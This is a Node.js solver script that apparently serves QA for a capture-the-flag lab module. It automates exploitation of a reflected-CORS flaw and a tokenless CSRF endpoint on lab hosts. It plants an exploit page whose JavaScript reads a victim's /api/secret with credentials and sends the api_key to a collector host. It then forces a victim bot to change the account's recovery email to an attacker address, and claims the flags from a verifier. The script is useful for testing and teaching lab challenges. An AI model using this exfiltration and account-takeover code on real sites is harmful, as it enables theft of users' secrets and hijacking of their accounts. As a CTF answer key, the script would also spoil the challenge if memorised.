#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV M2 (aslv-portal), INTENDED PATH (FR-14).
 *
 * Both event-verified flags (arch §7.0 M2):
 *   CORS — /api/secret reflects any Origin + credentials. Drive the innocent
 *          (victim bot) to read it from the ATTACKER origin: her api_key lands
 *          in the collector's exfil log with cross-site context → the /verify
 *          dual check (attacker origin + session-bound secret) mints the flag.
 *   CSRF — /account/recovery-email has no token and no origin check. Drive the
 *          victim bot to POST a new recovery email with her session → the
 *          verifier observes the innocent-row state change and mints the flag.
 *
 * Solo-play model (player-guide §3): the server-side victim bot on the
 * collector vhost (POST /victim) is the innocent browser.
 *
 * Env: M2_URL (default http://localhost:18022 — m2 standalone sidecar).
 * Node 20+ built-ins only. Exit 0 only when BOTH flags are minted.
 */
import http from 'node:http';

const M2_URL = process.env.M2_URL || 'http://localhost:18022';
const BASE = new URL(M2_URL);
const PORT = Number(BASE.port || 80);
const HOSTS = {
  victim: `victim.aslv.lab:${PORT}`,
  attacker: `attacker.aslv.lab:${PORT}`,
  collector: `collector.aslv.lab:${PORT}`,
};
const CORS_FLAG_RE = /ASLV\{CORS-\d{9,10}\}/;
const CSRF_FLAG_RE = /ASLV\{CSRF-\d{9,10}\}/;

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (host) h.host = host;
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (jar) {
            for (const c of res.headers['set-cookie'] || []) {
              const m = /([^=;]+)=([^;]*)/.exec(c);
              if (m) jar.set(m[1].trim(), m[2]);
            }
          }
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

async function main() {
  log(`M2 target: ${M2_URL} (victim=${HOSTS.victim} attacker=${HOSTS.attacker} collector=${HOSTS.collector})`);
  const flags = {};

  /* 1. login as the known tester (sanity + credentials for the exploit server) */
  const jar = new Map();
  const login = await request('POST', '/login', {
    host: HOSTS.victim,
    jar,
    headers: { accept: 'application/json' },
    body: { username: '0xnhsec', password: 'vlh-tester-01' },
  });
  if (login.status !== 200 || !login.json?.ok) die(`tester login failed: ${login.status} ${login.text.slice(0, 200)}`);
  ok(`logged in as ${login.json.username} (session cookie acquired)`);
  const me = await request('GET', '/me', { host: HOSTS.victim, jar });
  if (me.status !== 200) die(`tester /me failed: ${me.status} ${me.text.slice(0, 200)}`);

  /* 2. host the exploit page on the attacker vhost (the malicious origin) */
  const page = `<!doctype html><html><body>
<script>
fetch('http://victim.aslv.lab:${PORT}/api/secret', {credentials:'include'})
  .then(r => r.text())
  .then(t => fetch('http://collector.aslv.lab:${PORT}/collect', {
    method:'POST', headers:{'content-type':'application/json'},
    body: JSON.stringify({payload: t}) }));
</script></body></html>`;
  const put = await request('PUT', '/pages/solver-cors.html', {
    host: HOSTS.attacker,
    jar,
    body: { body: page },
  });
  if (put.status !== 200 || !put.json?.stored) die(`exploit page upload failed: ${put.status} ${put.text.slice(0, 200)}`);
  ok('exploit page stored on attacker.aslv.lab (/pages/solver-cors.html)');

  /* 3. CORS — victim bot reads /api/secret FROM the attacker origin.
   * The bot attaches the innocent's fresh session and models the SOP-permitted
   * cross-site read the reflected ACAO+credentials would grant: the response
   * (with her api_key) is piped into the exfil verifier with cross-site
   * context attached. */
  log('CORS: driving the victim bot to /api/secret from the attacker origin');
  const bot = await request('POST', '/victim', {
    host: HOSTS.collector,
    body: {
      url: `http://victim.aslv.lab:${PORT}/api/secret`,
      origin: `http://attacker.aslv.lab:${PORT}`,
      referer: `http://attacker.aslv.lab:${PORT}/pages/solver-cors.html`,
    },
  });
  if (bot.status !== 200) die(`victim bot failed: ${bot.status} ${bot.text.slice(0, 300)}`);
  const lastHop = (bot.json?.hops || []).at(-1);
  if (!lastHop || lastHop.status !== 200) {
    die(`victim bot did not read /api/secret successfully: ${JSON.stringify(bot.json)}`);
  }
  if (!/api_key/.test(bot.json.excerpt || '')) {
    die(`victim bot response did not contain the innocent api_key: ${(bot.json.excerpt || '').slice(0, 200)}`);
  }
  ok('victim bot read /api/secret cross-site (innocent api_key captured in the exfil model)');

  /* 4. claim the CORS flag from the verifier */
  const v1 = await request('GET', '/verify?category=CORS', { host: HOSTS.collector });
  if (v1.status !== 200 || !v1.json?.verified || !CORS_FLAG_RE.test(v1.json.flag || '')) {
    die(`/verify?category=CORS did not mint: ${v1.status} ${v1.text.slice(0, 300)}`);
  }
  flags.CORS = v1.json.flag;
  ok(`CORS flag: ${flags.CORS} (${v1.json.reason})`);

  /* 5. CSRF — victim bot POSTs a new recovery email with the innocent session.
   * The endpoint has no CSRF token and no origin check, so the state change
   * lands. (No origin is passed — the CSRF class needs none, and it keeps the
   * exfil log's latest hit bound to the CORS step above.) */
  log('CSRF: driving the victim bot to POST /account/recovery-email');
  const bot2 = await request('POST', '/victim', {
    host: HOSTS.collector,
    body: {
      url: `http://victim.aslv.lab:${PORT}/account/recovery-email`,
      method: 'POST',
      body: { email: 'attacker@evil.example' },
    },
  });
  if (bot2.status !== 200) die(`victim bot failed: ${bot2.status} ${bot2.text.slice(0, 300)}`);
  const lastHop2 = (bot2.json?.hops || []).at(-1);
  if (!lastHop2 || lastHop2.status !== 200) {
    die(`victim bot recovery-email POST failed: ${JSON.stringify(bot2.json)}`);
  }
  ok('innocent recovery_email changed via cross-site POST (no token, no origin check)');

  /* 6. claim the CSRF flag */
  const v2 = await request('GET', '/verify?category=CSRF', { host: HOSTS.collector });
  if (v2.status !== 200 || !v2.json?.verified || !CSRF_FLAG_RE.test(v2.json.flag || '')) {
    die(`/verify?category=CSRF did not mint: ${v2.status} ${v2.text.slice(0, 300)}`);
  }
  flags.CSRF = v2.json.flag;
  ok(`CSRF flag: ${flags.CSRF} (${v2.json.reason})`);

  console.log('\n=== M2 intended path: BOTH FLAGS ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${M2_URL} (${e.code}) — is the m2 profile running?  docker compose --profile m2 up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
